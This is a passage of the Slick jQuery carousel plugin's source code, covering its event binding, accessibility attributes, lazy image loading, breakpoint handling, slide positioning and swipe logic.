      _.$slides.not(_.$slideTrack.find(".slick-cloned")).each(function (i) {
        var slideControlIndex = tabControlIndexes.indexOf(i);
        $(this).attr({
          role: "tabpanel",
          id: "slick-slide" + _.instanceUid + i,
          tabindex: -1
        });
        if (slideControlIndex !== -1) {
          var ariaButtonControl = "slick-slide-control" + _.instanceUid + slideControlIndex;
          if ($("#" + ariaButtonControl).length) {
            $(this).attr({
              "aria-describedby": ariaButtonControl
            });
          }
        }
      });
      _.$dots.attr("role", "tablist").find("li").each(function (i) {
        var mappedSlideIndex = tabControlIndexes[i];
        $(this).attr({
          role: "presentation"
        });
        $(this).find("button").first().attr({
          role: "tab",
          id: "slick-slide-control" + _.instanceUid + i,
          "aria-controls": "slick-slide" + _.instanceUid + mappedSlideIndex,
          "aria-label": i + 1 + " of " + numDotGroups,
          "aria-selected": null,
          tabindex: "-1"
        });
      }).eq(_.currentSlide).find("button").attr({
        "aria-selected": "true",
        tabindex: "0"
      }).end();
    }
    for (var i = _.currentSlide, max = i + _.options.slidesToShow; i < max; i++) {
      if (_.options.focusOnChange) {
        _.$slides.eq(i).attr({
          tabindex: "0"
        });
      } else {
        _.$slides.eq(i).removeAttr("tabindex");
      }
    }
    _.activateADA();
  };
  Slick.prototype.initArrowEvents = function () {
    var _ = this;
    if (_.options.arrows === true && _.slideCount > _.options.slidesToShow) {
      _.$prevArrow.off("click.slick").on("click.slick", {
        message: "previous"
      }, _.changeSlide);
      _.$nextArrow.off("click.slick").on("click.slick", {
        message: "next"
      }, _.changeSlide);
      if (_.options.accessibility === true) {
        _.$prevArrow.on("keydown.slick", _.keyHandler);
        _.$nextArrow.on("keydown.slick", _.keyHandler);
      }
    }
  };
  Slick.prototype.initDotEvents = function () {
    var _ = this;
    if (_.options.dots === true && _.slideCount > _.options.slidesToShow) {
      $("li", _.$dots).on("click.slick", {
        message: "index"
      }, _.changeSlide);
      if (_.options.accessibility === true) {
        _.$dots.on("keydown.slick", _.keyHandler);
      }
    }
    if (_.options.dots === true && _.options.pauseOnDotsHover === true && _.slideCount > _.options.slidesToShow) {
      $("li", _.$dots).on("mouseenter.slick", $.proxy(_.interrupt, _, true)).on("mouseleave.slick", $.proxy(_.interrupt, _, false));
    }
  };
  Slick.prototype.initSlideEvents = function () {
    var _ = this;
    if (_.options.pauseOnHover) {
      _.$list.on("mouseenter.slick", $.proxy(_.interrupt, _, true));
      _.$list.on("mouseleave.slick", $.proxy(_.interrupt, _, false));
    }
  };
  Slick.prototype.initializeEvents = function () {
    var _ = this;
    _.initArrowEvents();
    _.initDotEvents();
    _.initSlideEvents();
    _.$list.on("touchstart.slick mousedown.slick", {
      action: "start"
    }, _.swipeHandler);
    _.$list.on("touchmove.slick mousemove.slick", {
      action: "move"
    }, _.swipeHandler);
    _.$list.on("touchend.slick mouseup.slick", {
      action: "end"
    }, _.swipeHandler);
    _.$list.on("touchcancel.slick mouseleave.slick", {
      action: "end"
    }, _.swipeHandler);
    _.$list.on("click.slick", _.clickHandler);
    $(document).on(_.visibilityChange, $.proxy(_.visibility, _));
    if (_.options.accessibility === true) {
      _.$list.on("keydown.slick", _.keyHandler);
    }
    if (_.options.focusOnSelect === true) {
      $(_.$slideTrack).children().on("click.slick", _.selectHandler);
    }
    $(window).on("orientationchange.slick.slick-" + _.instanceUid, $.proxy(_.orientationChange, _));
    $(window).on("resize.slick.slick-" + _.instanceUid, $.proxy(_.resize, _));
    $("[draggable!=true]", _.$slideTrack).on("dragstart", _.preventDefault);
    $(window).on("load.slick.slick-" + _.instanceUid, _.setPosition);
    $(_.setPosition);
  };
  Slick.prototype.initUI = function () {
    var _ = this;
    if (_.options.arrows === true && _.slideCount > _.options.slidesToShow) {
      _.$prevArrow.show();
      _.$nextArrow.show();
    }
    if (_.options.dots === true && _.slideCount > _.options.slidesToShow) {
      _.$dots.show();
    }
  };
  Slick.prototype.keyHandler = function (event) {
    var _ = this;
    if (!event.target.tagName.match("TEXTAREA|INPUT|SELECT")) {
      if (event.keyCode === 37 && _.options.accessibility === true) {
        _.changeSlide({
          data: {
            message: _.options.rtl === true ? "next" : "previous"
          }
        });
      } else if (event.keyCode === 39 && _.options.accessibility === true) {
        _.changeSlide({
          data: {
            message: _.options.rtl === true ? "previous" : "next"
          }
        });
      }
    }
  };
  Slick.prototype.lazyLoad = function () {
    var _ = this,
      loadRange,
      cloneRange,
      rangeStart,
      rangeEnd;
    function loadImages(imagesScope) {
      $("img[data-lazy]", imagesScope).each(function () {
        var image = $(this),
          imageSource = $(this).attr("data-lazy"),
          imageSrcSet = $(this).attr("data-srcset"),
          imageSizes = $(this).attr("data-sizes") || _.$slider.attr("data-sizes"),
          imageToLoad = document.createElement("img");
        imageToLoad.onload = function () {
          image.animate({
            opacity: 0
          }, 100, function () {
            if (imageSrcSet) {
              image.attr("srcset", imageSrcSet);
              if (imageSizes) {
                image.attr("sizes", imageSizes);
              }
            }
            image.attr("src", imageSource).animate({
              opacity: 1
            }, 200, function () {
              image.removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading");
            });
            _.$slider.trigger("lazyLoaded", [_, image, imageSource]);
          });
        };
        imageToLoad.onerror = function () {
          image.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error");
          _.$slider.trigger("lazyLoadError", [_, image, imageSource]);
        };
        imageToLoad.src = imageSource;
      });
    }
    if (_.options.centerMode === true) {
      if (_.options.infinite === true) {
        rangeStart = _.currentSlide + (_.options.slidesToShow / 2 + 1);
        rangeEnd = rangeStart + _.options.slidesToShow + 2;
      } else {
        rangeStart = Math.max(0, _.currentSlide - (_.options.slidesToShow / 2 + 1));
        rangeEnd = 2 + (_.options.slidesToShow / 2 + 1) + _.currentSlide;
      }
    } else {
      rangeStart = _.options.infinite ? _.options.slidesToShow + _.currentSlide : _.currentSlide;
      rangeEnd = Math.ceil(rangeStart + _.options.slidesToShow);
      if (_.options.fade === true) {
        if (rangeStart > 0) rangeStart--;
        if (rangeEnd <= _.slideCount) rangeEnd++;
      }
    }
    loadRange = _.$slider.find(".slick-slide").slice(rangeStart, rangeEnd);
    if (_.options.lazyLoad === "anticipated") {
      var prevSlide = rangeStart - 1,
        nextSlide = rangeEnd,
        $slides = _.$slider.find(".slick-slide");
      for (var i = 0; i < _.options.slidesToScroll; i++) {
        if (prevSlide < 0) prevSlide = _.slideCount - 1;
        loadRange = loadRange.add($slides.eq(prevSlide));
        loadRange = loadRange.add($slides.eq(nextSlide));
        prevSlide--;
        nextSlide++;
      }
    }
    loadImages(loadRange);
    if (_.slideCount <= _.options.slidesToShow) {
      cloneRange = _.$slider.find(".slick-slide");
      loadImages(cloneRange);
    } else if (_.currentSlide >= _.slideCount - _.options.slidesToShow) {
      cloneRange = _.$slider.find(".slick-cloned").slice(0, _.options.slidesToShow);
      loadImages(cloneRange);
    } else if (_.currentSlide === 0) {
      cloneRange = _.$slider.find(".slick-cloned").slice(_.options.slidesToShow * -1);
      loadImages(cloneRange);
    }
  };
  Slick.prototype.loadSlider = function () {
    var _ = this;
    _.setPosition();
    _.$slideTrack.css({
      opacity: 1
    });
    _.$slider.removeClass("slick-loading");
    _.initUI();
    if (_.options.lazyLoad === "progressive") {
      _.progressiveLazyLoad();
    }
  };
  Slick.prototype.next = Slick.prototype.slickNext = function () {
    var _ = this;
    _.changeSlide({
      data: {
        message: "next"
      }
    });
  };
  Slick.prototype.orientationChange = function () {
    var _ = this;
    _.checkResponsive();
    _.setPosition();
  };
  Slick.prototype.pause = Slick.prototype.slickPause = function () {
    var _ = this;
    _.autoPlayClear();
    _.paused = true;
  };
  Slick.prototype.play = Slick.prototype.slickPlay = function () {
    var _ = this;
    _.autoPlay();
    _.options.autoplay = true;
    _.paused = false;
    _.focussed = false;
    _.interrupted = false;
  };
  Slick.prototype.postSlide = function (index) {
    var _ = this;
    if (!_.unslicked) {
      _.$slider.trigger("afterChange", [_, index]);
      _.animating = false;
      if (_.slideCount > _.options.slidesToShow) {
        _.setPosition();
      }
      _.swipeLeft = null;
      if (_.options.autoplay) {
        _.autoPlay();
      }
      if (_.options.accessibility === true) {
        _.initADA();
        if (_.options.focusOnChange) {
          var $currentSlide = $(_.$slides.get(_.currentSlide));
          $currentSlide.attr("tabindex", 0).focus();
        }
      }
    }
  };
  Slick.prototype.prev = Slick.prototype.slickPrev = function () {
    var _ = this;
    _.changeSlide({
      data: {
        message: "previous"
      }
    });
  };
  Slick.prototype.preventDefault = function (event) {
    event.preventDefault();
  };
  Slick.prototype.progressiveLazyLoad = function (tryCount) {
    tryCount = tryCount || 1;
    var _ = this,
      $imgsToLoad = $("img[data-lazy]", _.$slider),
      image,
      imageSource,
      imageSrcSet,
      imageSizes,
      imageToLoad;
    if ($imgsToLoad.length) {
      image = $imgsToLoad.first();
      imageSource = image.attr("data-lazy");
      imageSrcSet = image.attr("data-srcset");
      imageSizes = image.attr("data-sizes") || _.$slider.attr("data-sizes");
      imageToLoad = document.createElement("img");
      imageToLoad.onload = function () {
        if (imageSrcSet) {
          image.attr("srcset", imageSrcSet);
          if (imageSizes) {
            image.attr("sizes", imageSizes);
          }
        }
        image.attr("src", imageSource).removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading");
        if (_.options.adaptiveHeight === true) {
          _.setPosition();
        }
        _.$slider.trigger("lazyLoaded", [_, image, imageSource]);
        _.progressiveLazyLoad();
      };
      imageToLoad.onerror = function () {
        if (tryCount < 3) {
          setTimeout(function () {
            _.progressiveLazyLoad(tryCount + 1);
          }, 500);
        } else {
          image.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error");
          _.$slider.trigger("lazyLoadError", [_, image, imageSource]);
          _.progressiveLazyLoad();
        }
      };
      imageToLoad.src = imageSource;
    } else {
      _.$slider.trigger("allImagesLoaded", [_]);
    }
  };
  Slick.prototype.refresh = function (initializing) {
    var _ = this,
      currentSlide,
      lastVisibleIndex;
    lastVisibleIndex = _.slideCount - _.options.slidesToShow;
    if (!_.options.infinite && _.currentSlide > lastVisibleIndex) {
      _.currentSlide = lastVisibleIndex;
    }
    if (_.slideCount <= _.options.slidesToShow) {
      _.currentSlide = 0;
    }
    currentSlide = _.currentSlide;
    _.destroy(true);
    $.extend(_, _.initials, {
      currentSlide: currentSlide
    });
    _.init();
    if (!initializing) {
      _.changeSlide({
        data: {
          message: "index",
          index: currentSlide
        }
      }, false);
    }
  };
  Slick.prototype.registerBreakpoints = function () {
    var _ = this,
      breakpoint,
      currentBreakpoint,
      l,
      responsiveSettings = _.options.responsive || null;
    if ($.type(responsiveSettings) === "array" && responsiveSettings.length) {
      _.respondTo = _.options.respondTo || "window";
      for (breakpoint in responsiveSettings) {
        l = _.breakpoints.length - 1;
        if (responsiveSettings.hasOwnProperty(breakpoint)) {
          currentBreakpoint = responsiveSettings[breakpoint].breakpoint;
          while (l >= 0) {
            if (_.breakpoints[l] && _.breakpoints[l] === currentBreakpoint) {
              _.breakpoints.splice(l, 1);
            }
            l--;
          }
          _.breakpoints.push(currentBreakpoint);
          _.breakpointSettings[currentBreakpoint] = responsiveSettings[breakpoint].settings;
        }
      }
      _.breakpoints.sort(function (a, b) {
        return _.options.mobileFirst ? a - b : b - a;
      });
    }
  };
  Slick.prototype.reinit = function () {
    var _ = this;
    _.$slides = _.$slideTrack.children(_.options.slide).addClass("slick-slide");
    _.slideCount = _.$slides.length;
    if (_.currentSlide >= _.slideCount && _.currentSlide !== 0) {
      _.currentSlide = _.currentSlide - _.options.slidesToScroll;
    }
    if (_.slideCount <= _.options.slidesToShow) {
      _.currentSlide = 0;
    }
    _.registerBreakpoints();
    _.setProps();
    _.setupInfinite();
    _.buildArrows();
    _.updateArrows();
    _.initArrowEvents();
    _.buildDots();
    _.updateDots();
    _.initDotEvents();
    _.cleanUpSlideEvents();
    _.initSlideEvents();
    _.checkResponsive(false, true);
    if (_.options.focusOnSelect === true) {
      $(_.$slideTrack).children().on("click.slick", _.selectHandler);
    }
    _.setSlideClasses(typeof _.currentSlide === "number" ? _.currentSlide : 0);
    _.setPosition();
    _.focusHandler();
    _.paused = !_.options.autoplay;
    _.autoPlay();
    _.$slider.trigger("reInit", [_]);
  };
  Slick.prototype.resize = function () {
    var _ = this;
    if ($(window).width() !== _.windowWidth) {
      clearTimeout(_.windowDelay);
      _.windowDelay = window.setTimeout(function () {
        _.windowWidth = $(window).width();
        _.checkResponsive();
        if (!_.unslicked) {
          _.setPosition();
        }
      }, 50);
    }
  };
  Slick.prototype.removeSlide = Slick.prototype.slickRemove = function (index, removeBefore, removeAll) {
    var _ = this;
    if (typeof index === "boolean") {
      removeBefore = index;
      index = removeBefore === true ? 0 : _.slideCount - 1;
    } else {
      index = removeBefore === true ? --index : index;
    }
    if (_.slideCount < 1 || index < 0 || index > _.slideCount - 1) {
      return false;
    }
    _.unload();
    if (removeAll === true) {
      _.$slideTrack.children().remove();
    } else {
      _.$slideTrack.children(this.options.slide).eq(index).remove();
    }
    _.$slides = _.$slideTrack.children(this.options.slide);
    _.$slideTrack.children(this.options.slide).detach();
    _.$slideTrack.append(_.$slides);
    _.$slidesCache = _.$slides;
    _.reinit();
  };
  Slick.prototype.setCSS = function (position) {
    var _ = this,
      positionProps = {},
      x,
      y;
    if (_.options.rtl === true) {
      position = -position;
    }
    x = _.positionProp == "left" ? Math.ceil(position) + "px" : "0px";
    y = _.positionProp == "top" ? Math.ceil(position) + "px" : "0px";
    positionProps[_.positionProp] = position;
    if (_.transformsEnabled === false) {
      _.$slideTrack.css(positionProps);
    } else {
      positionProps = {};
      if (_.cssTransitions === false) {
        positionProps[_.animType] = "translate(" + x + ", " + y + ")";
        _.$slideTrack.css(positionProps);
      } else {
        positionProps[_.animType] = "translate3d(" + x + ", " + y + ", 0px)";
        _.$slideTrack.css(positionProps);
      }
    }
  };
  Slick.prototype.setDimensions = function () {
    var _ = this;
    if (_.options.vertical === false) {
      if (_.options.centerMode === true) {
        _.$list.css({
          padding: "0px " + _.options.centerPadding
        });
      }
    } else {
      _.$list.height(_.$slides.first().outerHeight(true) * _.options.slidesToShow);
      if (_.options.centerMode === true) {
        _.$list.css({
          padding: _.options.centerPadding + " 0px"
        });
      }
    }
    _.listWidth = _.$list.width();
    _.listHeight = _.$list.height();
    if (_.options.vertical === false && _.options.variableWidth === false) {
      _.slideWidth = Math.ceil(_.listWidth / _.options.slidesToShow);
      _.$slideTrack.width(Math.ceil(_.slideWidth * _.$slideTrack.children(".slick-slide").length));
    } else if (_.options.variableWidth === true) {
      _.$slideTrack.width(5e3 * _.slideCount);
    } else {
      _.slideWidth = Math.ceil(_.listWidth);
      _.$slideTrack.height(Math.ceil(_.$slides.first().outerHeight(true) * _.$slideTrack.children(".slick-slide").length));
    }
    var offset = _.$slides.first().outerWidth(true) - _.$slides.first().width();
    if (_.options.variableWidth === false) _.$slideTrack.children(".slick-slide").width(_.slideWidth - offset);
  };
  Slick.prototype.setFade = function () {
    var _ = this,
      targetLeft;
    _.$slides.each(function (index, element) {
      targetLeft = _.slideWidth * index * -1;
      if (_.options.rtl === true) {
        $(element).css({
          position: "relative",
          right: targetLeft,
          top: 0,
          zIndex: _.options.zIndex - 2,
          opacity: 0
        });
      } else {
        $(element).css({
          position: "relative",
          left: targetLeft,
          top: 0,
          zIndex: _.options.zIndex - 2,
          opacity: 0
        });
      }
    });
    _.$slides.eq(_.currentSlide).css({
      zIndex: _.options.zIndex - 1,
      opacity: 1
    });
  };
  Slick.prototype.setHeight = function () {
    var _ = this;
    if (_.options.slidesToShow === 1 && _.options.adaptiveHeight === true && _.options.vertical === false) {
      var targetHeight = _.$slides.eq(_.currentSlide).outerHeight(true);
      _.$list.css("height", targetHeight);
    }
  };
  Slick.prototype.setOption = Slick.prototype.slickSetOption = function () {
    var _ = this,
      l,
      item,
      option,
      value,
      refresh = false,
      type;
    if ($.type(arguments[0]) === "object") {
      option = arguments[0];
      refresh = arguments[1];
      type = "multiple";
    } else if ($.type(arguments[0]) === "string") {
      option = arguments[0];
      value = arguments[1];
      refresh = arguments[2];
      if (arguments[0] === "responsive" && $.type(arguments[1]) === "array") {
        type = "responsive";
      } else if (typeof arguments[1] !== "undefined") {
        type = "single";
      }
    }
    if (type === "single") {
      _.options[option] = value;
    } else if (type === "multiple") {
      $.each(option, function (opt, val) {
        _.options[opt] = val;
      });
    } else if (type === "responsive") {
      for (item in value) {
        if ($.type(_.options.responsive) !== "array") {
          _.options.responsive = [value[item]];
        } else {
          l = _.options.responsive.length - 1;
          while (l >= 0) {
            if (_.options.responsive[l].breakpoint === value[item].breakpoint) {
              _.options.responsive.splice(l, 1);
            }
            l--;
          }
          _.options.responsive.push(value[item]);
        }
      }
    }
    if (refresh) {
      _.unload();
      _.reinit();
    }
  };
  Slick.prototype.setPosition = function () {
    var _ = this;
    _.setDimensions();
    _.setHeight();
    if (_.options.fade === false) {
      _.setCSS(_.getLeft(_.currentSlide));
    } else {
      _.setFade();
    }
    _.$slider.trigger("setPosition", [_]);
  };
  Slick.prototype.setProps = function () {
    var _ = this,
      bodyStyle = document.body.style;
    _.positionProp = _.options.vertical === true ? "top" : "left";
    if (_.positionProp === "top") {
      _.$slider.addClass("slick-vertical");
    } else {
      _.$slider.removeClass("slick-vertical");
    }
    if (bodyStyle.WebkitTransition !== undefined || bodyStyle.MozTransition !== undefined || bodyStyle.msTransition !== undefined) {
      if (_.options.useCSS === true) {
        _.cssTransitions = true;
      }
    }
    if (_.options.fade) {
      if (typeof _.options.zIndex === "number") {
        if (_.options.zIndex < 3) {
          _.options.zIndex = 3;
        }
      } else {
        _.options.zIndex = _.defaults.zIndex;
      }
    }
    if (bodyStyle.OTransform !== undefined) {
      _.animType = "OTransform";
      _.transformType = "-o-transform";
      _.transitionType = "OTransition";
      if (bodyStyle.perspectiveProperty === undefined && bodyStyle.webkitPerspective === undefined) _.animType = false;
    }
    if (bodyStyle.MozTransform !== undefined) {
      _.animType = "MozTransform";
      _.transformType = "-moz-transform";
      _.transitionType = "MozTransition";
      if (bodyStyle.perspectiveProperty === undefined && bodyStyle.MozPerspective === undefined) _.animType = false;
    }
    if (bodyStyle.webkitTransform !== undefined) {
      _.animType = "webkitTransform";
      _.transformType = "-webkit-transform";
      _.transitionType = "webkitTransition";
      if (bodyStyle.perspectiveProperty === undefined && bodyStyle.webkitPerspective === undefined) _.animType = false;
    }
    if (bodyStyle.msTransform !== undefined) {
      _.animType = "msTransform";
      _.transformType = "-ms-transform";
      _.transitionType = "msTransition";
      if (bodyStyle.msTransform === undefined) _.animType = false;
    }
    if (bodyStyle.transform !== undefined && _.animType !== false) {
      _.animType = "transform";
      _.transformType = "transform";
      _.transitionType = "transition";
    }
    _.transformsEnabled = _.options.useTransform && _.animType !== null && _.animType !== false;
  };
  Slick.prototype.setSlideClasses = function (index) {
    var _ = this,
      centerOffset,
      allSlides,
      indexOffset,
      remainder;
    allSlides = _.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden", "true");
    _.$slides.eq(index).addClass("slick-current");
    if (_.options.centerMode === true) {
      var evenCoef = _.options.slidesToShow % 2 === 0 ? 1 : 0;
      centerOffset = Math.floor(_.options.slidesToShow / 2);
      if (_.options.infinite === true) {
        if (index >= centerOffset && index <= _.slideCount - 1 - centerOffset) {
          _.$slides.slice(index - centerOffset + evenCoef, index + centerOffset + 1).addClass("slick-active").attr("aria-hidden", "false");
        } else {
          indexOffset = _.options.slidesToShow + index;
          allSlides.slice(indexOffset - centerOffset + 1 + evenCoef, indexOffset + centerOffset + 2).addClass("slick-active").attr("aria-hidden", "false");
        }
        if (index === 0) {
          allSlides.eq(allSlides.length - 1 - _.options.slidesToShow).addClass("slick-center");
        } else if (index === _.slideCount - 1) {
          allSlides.eq(_.options.slidesToShow).addClass("slick-center");
        }
      }
      _.$slides.eq(index).addClass("slick-center");
    } else {
      if (index >= 0 && index <= _.slideCount - _.options.slidesToShow) {
        _.$slides.slice(index, index + _.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false");
      } else if (allSlides.length <= _.options.slidesToShow) {
        allSlides.addClass("slick-active").attr("aria-hidden", "false");
      } else {
        remainder = _.slideCount % _.options.slidesToShow;
        indexOffset = _.options.infinite === true ? _.options.slidesToShow + index : index;
        if (_.options.slidesToShow == _.options.slidesToScroll && _.slideCount - index < _.options.slidesToShow) {
          allSlides.slice(indexOffset - (_.options.slidesToShow - remainder), indexOffset + remainder).addClass("slick-active").attr("aria-hidden", "false");
        } else {
          allSlides.slice(indexOffset, indexOffset + _.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false");
        }
      }
    }
    if (_.options.lazyLoad === "ondemand" || _.options.lazyLoad === "anticipated") {
      _.lazyLoad();
    }
  };
  Slick.prototype.setupInfinite = function () {
    var _ = this,
      i,
      slideIndex,
      infiniteCount;
    if (_.options.fade === true) {
      _.options.centerMode = false;
    }
    if (_.options.infinite === true && _.options.fade === false) {
      slideIndex = null;
      if (_.slideCount > _.options.slidesToShow) {
        if (_.options.centerMode === true) {
          infiniteCount = _.options.slidesToShow + 1;
        } else {
          infiniteCount = _.options.slidesToShow;
        }
        for (i = _.slideCount; i > _.slideCount - infiniteCount; i -= 1) {
          slideIndex = i - 1;
          $(_.$slides[slideIndex]).clone(true).attr("id", "").attr("data-slick-index", slideIndex - _.slideCount).prependTo(_.$slideTrack).addClass("slick-cloned");
        }
        for (i = 0; i < infiniteCount + _.slideCount; i += 1) {
          slideIndex = i;
          $(_.$slides[slideIndex]).clone(true).attr("id", "").attr("data-slick-index", slideIndex + _.slideCount).appendTo(_.$slideTrack).addClass("slick-cloned");
        }
        _.$slideTrack.find(".slick-cloned").find("[id]").each(function () {
          $(this).attr("id", "");
        });
      }
    }
  };
  Slick.prototype.interrupt = function (toggle) {
    var _ = this;
    if (!toggle) {
      _.autoPlay();
    }
    _.interrupted = toggle;
  };
  Slick.prototype.selectHandler = function (event) {
    var _ = this;
    var targetElement = $(event.target).is(".slick-slide") ? $(event.target) : $(event.target).parents(".slick-slide");
    var index = parseInt(targetElement.attr("data-slick-index"));
    if (!index) index = 0;
    if (_.slideCount <= _.options.slidesToShow) {
      _.slideHandler(index, false, true);
      return;
    }
    _.slideHandler(index);
  };
  Slick.prototype.slideHandler = function (index, sync, dontAnimate) {
    var targetSlide,
      animSlide,
      oldSlide,
      slideLeft,
      targetLeft = null,
      _ = this,
      navTarget;
    sync = sync || false;
    if (_.animating === true && _.options.waitForAnimate === true) {
      return;
    }
    if (_.options.fade === true && _.currentSlide === index) {
      return;
    }
    if (sync === false) {
      _.asNavFor(index);
    }
    targetSlide = index;
    targetLeft = _.getLeft(targetSlide);
    slideLeft = _.getLeft(_.currentSlide);
    _.currentLeft = _.swipeLeft === null ? slideLeft : _.swipeLeft;
    if (_.options.infinite === false && _.options.centerMode === false && (index < 0 || index > _.getDotCount() * _.options.slidesToScroll)) {
      if (_.options.fade === false) {
        targetSlide = _.currentSlide;
        if (dontAnimate !== true && _.slideCount > _.options.slidesToShow) {
          _.animateSlide(slideLeft, function () {
            _.postSlide(targetSlide);
          });
        } else {
          _.postSlide(targetSlide);
        }
      }
      return;
    } else if (_.options.infinite === false && _.options.centerMode === true && (index < 0 || index > _.slideCount - _.options.slidesToScroll)) {
      if (_.options.fade === false) {
        targetSlide = _.currentSlide;
        if (dontAnimate !== true && _.slideCount > _.options.slidesToShow) {
          _.animateSlide(slideLeft, function () {
            _.postSlide(targetSlide);
          });
        } else {
          _.postSlide(targetSlide);
        }
      }
      return;
    }
    if (_.options.autoplay) {
      clearInterval(_.autoPlayTimer);
    }
    if (targetSlide < 0) {
      if (_.slideCount % _.options.slidesToScroll !== 0) {
        animSlide = _.slideCount - _.slideCount % _.options.slidesToScroll;
      } else {
        animSlide = _.slideCount + targetSlide;
      }
    } else if (targetSlide >= _.slideCount) {
      if (_.slideCount % _.options.slidesToScroll !== 0) {
        animSlide = 0;
      } else {
        animSlide = targetSlide - _.slideCount;
      }
    } else {
      animSlide = targetSlide;
    }
    _.animating = true;
    _.$slider.trigger("beforeChange", [_, _.currentSlide, animSlide]);
    oldSlide = _.currentSlide;
    _.currentSlide = animSlide;
    _.setSlideClasses(_.currentSlide);
    if (_.options.asNavFor) {
      navTarget = _.getNavTarget();
      navTarget = navTarget.slick("getSlick");
      if (navTarget.slideCount <= navTarget.options.slidesToShow) {
        navTarget.setSlideClasses(_.currentSlide);
      }
    }
    _.updateDots();
    _.updateArrows();
    if (_.options.fade === true) {
      if (dontAnimate !== true) {
        _.fadeSlideOut(oldSlide);
        _.fadeSlide(animSlide, function () {
          _.postSlide(animSlide);
        });
      } else {
        _.postSlide(animSlide);
      }
      _.animateHeight();
      return;
    }
    if (dontAnimate !== true && _.slideCount > _.options.slidesToShow) {
      _.animateSlide(targetLeft, function () {
        _.postSlide(animSlide);
      });
    } else {
      _.postSlide(animSlide);
    }
  };
  Slick.prototype.startLoad = function () {
    var _ = this;
    if (_.options.arrows === true && _.slideCount > _.options.slidesToShow) {
      _.$prevArrow.hide();
      _.$nextArrow.hide();
    }
    if (_.options.dots === true && _.slideCount > _.options.slidesToShow) {
      _.$dots.hide();
    }
    _.$slider.addClass("slick-loading");
  };
  Slick.prototype.swipeDirection = function () {
    var xDist,
      yDist,
      r,
      swipeAngle,
      _ = this;
    xDist = _.touchObject.startX - _.touchObject.curX;
    yDist = _.touchObject.startY - _.touchObject.curY;
    r = Math.atan2(yDist, xDist);
    swipeAngle = Math.round(r * 180 / Math.PI);
    if (swipeAngle < 0) {
      swipeAngle = 360 - Math.abs(swipeAngle);
    }
    if (swipeAngle <= 45 && swipeAngle >= 0) {
      return _.options.rtl === false ? "left" : "right";
    }
    if (swipeAngle <= 360 && swipeAngle >= 315) {
      return _.options.rtl === false ? "left" : "right";
    }
    if (swipeAngle >= 135 && swipeAngle <= 225) {
      return _.options.rtl === false ? "right" : "left";
    }
    if (_.options.verticalSwiping === true) {
      if (swipeAngle >= 35 && swipeAngle <= 135) {
        return "down";
      } else {
        return "up";
      }
    }
    return "vertical";
  };
  Slick.prototype.swipeEnd = function (event) {
    var _ = this,
      slideCount,
      direction;
    _.dragging = false;
    _.swiping = false;
    if (_.scrolling) {
      _.scrolling = false;
      return false;
    }
    _.interrupted = false;
    _.shouldClick = _.touchObject.swipeLength > 10 ? false : true;
    if (_.touchObject.curX === undefined) {
      return false;
    }
    if (_.touchObject.edgeHit === true) {
      _.$slider.trigger("edge", [_, _.swipeDirection()]);
    }
    if (_.touchObject.swipeLength >= _.touchObject.minSwipe) {
      direction = _.swipeDirection();
      switch (direction) {
        case "left":
        case "down":
          slideCount = _.options.swipeToSlide ? _.checkNavigable(_.currentSlide + _.getSlideCount()) : _.currentSlide + _.getSlideCount();
          _.currentDirection = 0;
          break;
        case "right":
        case "up":
          slideCount = _.options.swipeToSlide ? _.checkNavigable(_.currentSlide - _.getSlideCount()) : _.currentSlide - _.getSlideCount();
          _.currentDirection = 1;
          break;
        default:
      }
      if (direction != "vertical") {
        _.slideHandler(slideCount);
        _.touchObject = {};
        _.$slider.trigger("swipe", [_, direction]);
      }
    } else {
      if (_.touchObject.startX !== _.touchObject.curX) {
        _.slideHandler(_.currentSlide);
        _.touchObject = {};
      }
    }
  };
  Slick.prototype.swipeHandler = function (event) {
    var _ = this;
    if (_.options.swipe === false || "ontouchend" in document && _.options.swipe === false) {
      return;
    } else if (_.options.draggable === false && event.type.indexOf("mouse") !== -1) {
      return;
    }
    _.touchObject.fingerCount = event.originalEvent && event.originalEvent.touches !== undefined ? event.originalEvent.touches.length : 1;
    _.touchObject.minSwipe = _.listWidth / _.options.touchThreshold;
    if (_.options.verticalSwiping === true) {
      _.touchObject.minSwipe = _.listHeight / _.options.touchThreshold;
    }
    switch (event.data.action) {
      case "start":
        _.swipeStart(event);
        break;
      case "move":
        _.swipeMove(event);
        break;
      case "end":
        _.swipeEnd(event);
        break;
    }
  };
  Slick.prototype.swipeMove = function (event) {
    var _ = this,
      edgeWasHit = false,
      curLeft,
      swipeDirection,
      swipeLength,
      positionOffset,
      touches,
      verticalSwipeLength;
    touches = event.originalEvent !== undefined ? event.originalEvent.touches : null;
    if (!_.dragging || _.scrolling || touches && touches.length !== 1) {
      return false;
    }
    curLeft = _.getLeft(_.currentSlide);
    _.touchObject.curX = touches !== undefined ? touches[0].pageX : event.clientX;
    _.touchObject.curY = touches !== undefined ? touches[0].pageY : event.clientY;
    _.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(_.touchObject.curX - _.touchObject.startX, 2)));
    verticalSwipeLength = Math.round(Math.sqrt(Math.pow(_.touchObject.curY - _.touchObject.startY, 2)));
    if (!_.options.verticalSwiping && !_.swiping && verticalSwipeLength > 4) {
      _.scrolling = true;
      return false;
    }
    if (_.options.verticalSwiping === true) {
      _.touchObject.swipeLength = verticalSwipeLength;
    }
    swipeDirection = _.swipeDirection();
    if (event.originalEvent !== undefined && _.touchObject.swipeLength > 4) {
      _.swiping = true;
      event.preventDefault();
    }
    positionOffset = (_.options.rtl === false ? 1 : -1) * (_.touchObject.curX > _.touchObject.startX ? 1 : -1);
    if (_.options.verticalSwiping === true) {
      positionOffset = _.touchObject.curY > _.touchObject.startY ? 1 : -1;
    }
    swipeLength = _.touchObject.swipeLength;
    _.touchObject.edgeHit = false;
    if (_.options.infinite === false) {
      if (_.currentSlide === 0 && swipeDirection === "right" || _.currentSlide >= _.getDotCount() && swipeDirection === "left") {
        swipeLength = _.touchObject.swipeLength * _.options.edgeFriction;
        _.touchObject.edgeHit = true;
      }
    }
    if (_.options.vertical === false) {
      _.swipeLeft = curLeft + swipeLength * positionOffset;
    } else {
      _.swipeLeft = curLeft + swipeLength * (_.$list.height() / _.listWidth) * positionOffset;
    }
